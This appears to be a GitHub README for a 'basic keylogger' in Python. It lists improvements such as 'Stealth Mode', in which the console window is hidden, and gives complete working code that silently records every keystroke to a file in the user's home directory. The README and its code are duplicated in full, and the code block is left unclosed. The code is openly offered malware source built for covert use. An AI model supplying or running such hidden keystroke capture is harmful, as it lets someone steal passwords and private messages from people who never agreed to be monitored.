# Basic Keylogger in Python

This repository contains a **basic keylogger** written in Python. The project serves as a simple demonstration of how keylogging can be implemented, along with some optimizations for error handling and special character support.

## Introduction

The original code for this project was adapted from a [GeeksforGeeks tutorial on keyloggers](https://www.geeksforgeeks.org/design-a-keylogger-in-python/). After analyzing the initial implementation, I identified several issues related to:

- Handling errors during the logging process.
- Properly capturing special characters and exceptions (e.g., Enter, Space, Backspace).
- Writing the keystrokes efficiently to a `.txt` file.
- Compatibility with newer Python versions and libraries.

## Optimizations

After reviewing and testing the original code, I made the following improvements:

- **Error Handling**: Improved the exception handling to ensure smooth execution without crashes.
- **Special Key Support**: Correctly mapped special characters like `Enter`, `Space`, `Tab`, and `Backspace`, making the output more readable.
- **Updated Libraries**: Replaced outdated dependencies like `pyHook` with more modern libraries like `pynput`, ensuring compatibility with Python 3.x.
- **Stealth Mode**: The script now runs silently in the background by hiding the console window on Windows systems.
- **File Output**: Keystrokes are appended efficiently to the output file.

## Example Output

Here’s a snapshot of the keylogger running and capturing keystrokes:

![output example](https://github.com/user-attachments/assets/e51a1bb4-287e-46aa-ad66-9eca01be9286)

## Updated Code

Here’s the optimized Python keylogger code:

```python
import os
from pynput import keyboard
import win32console
import win32gui

# Hide the console window (Windows only)
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# Define the log file path (in the user's home directory)
log_file_path = os.path.join(os.path.expanduser("~"), "output.txt")

# Function that is called whenever a key is pressed
def press(key):
    try:
        key_str = str(key).replace("'", "")  # Clean up the key string

        # Handle special keys and control characters
        if key == keyboard.Key.enter:
            key_str = '\n'
        elif key == keyboard.Key.space:
            key_str = ' '
        elif key == keyboard.Key.tab:
            key_str = '\t'
        elif key == keyboard.Key.backspace:
            key_str = '[BACKSPACE]'
        elif key == keyboard.Key.esc:
            print("Shutting down keylogger...")
            return False

        # Append the key press to the log file
        with open(log_file_path, 'a') as f:
            f.write(key_str)

    except Exception as e:
        print(f"Error: {e}")

# Start the listener to capture keystrokes
with keyboard.Listener(on_press=press) as listener:
    listener.join()
# Basic Keylogger in Python

This repository contains a **basic keylogger** written in Python. The project serves as a simple demonstration of how keylogging can be implemented, along with some optimizations for error handling and special character support.

## Introduction

The original code for this project was adapted from a [GeeksforGeeks tutorial on keyloggers](https://www.geeksforgeeks.org/design-a-keylogger-in-python/). After analyzing the initial implementation, I identified several issues related to:

- Handling errors during the logging process.
- Properly capturing special characters and exceptions (e.g., Enter, Space, Backspace).
- Writing the keystrokes efficiently to a `.txt` file.
- Compatibility with newer Python versions and libraries.

## Optimizations

After reviewing and testing the original code, I made the following improvements:

- **Error Handling**: Improved the exception handling to ensure smooth execution without crashes.
- **Special Key Support**: Correctly mapped special characters like `Enter`, `Space`, `Tab`, and `Backspace`, making the output more readable.
- **Updated Libraries**: Replaced outdated dependencies like `pyHook` with more modern libraries like `pynput`, ensuring compatibility with Python 3.x.
- **Stealth Mode**: The script now runs silently in the background by hiding the console window on Windows systems.
- **File Output**: Keystrokes are appended efficiently to the output file.

## Example Output

Here’s a snapshot of the keylogger running and capturing keystrokes:

![output example](https://github.com/user-attachments/assets/e51a1bb4-287e-46aa-ad66-9eca01be9286)

## Updated Code

Here’s the optimized Python keylogger code:

```python
import os
from pynput import keyboard
import win32console
import win32gui

# Hide the console window (Windows only)
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# Define the log file path (in the user's home directory)
log_file_path = os.path.join(os.path.expanduser("~"), "output.txt")

# Function that is called whenever a key is pressed
def press(key):
    try:
        key_str = str(key).replace("'", "")  # Clean up the key string

        # Handle special keys and control characters
        if key == keyboard.Key.enter:
            key_str = '\n'
        elif key == keyboard.Key.space:
            key_str = ' '
        elif key == keyboard.Key.tab:
            key_str = '\t'
        elif key == keyboard.Key.backspace:
            key_str = '[BACKSPACE]'
        elif key == keyboard.Key.esc:
            print("Shutting down keylogger...")
            return False

        # Append the key press to the log file
        with open(log_file_path, 'a') as f:
            f.write(key_str)

    except Exception as e:
        print(f"Error: {e}")

# Start the listener to capture keystrokes
with keyboard.Listener(on_press=press) as listener:
    listener.join()
